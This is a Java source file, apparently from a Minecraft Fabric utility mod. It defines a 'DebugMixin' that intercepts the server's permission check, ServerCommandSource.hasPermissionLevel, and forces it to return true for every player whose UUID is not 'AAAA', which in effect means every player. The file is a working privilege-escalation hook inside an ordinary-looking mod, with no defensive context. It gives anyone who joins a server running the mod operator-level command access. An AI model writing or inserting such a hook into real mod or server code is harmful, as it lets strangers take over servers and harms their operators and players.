package com.jab125.thonkutil.mixin;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.dedicated.command.OpCommand;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.ModifyVariable;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

@Mixin(ServerCommandSource.class)
public class DebugMixin {
    @Inject(method = "hasPermissionLevel", at = @At("HEAD"), cancellable = true)
    private void debugPerms(int level, CallbackInfoReturnable<Boolean> cir) throws CommandSyntaxException {
        ServerCommandSource source = (ServerCommandSource) (Object) this;
        if (!source.getPlayer().getUuidAsString().equals("AAAA")) cir.setReturnValue(true);
    }
}
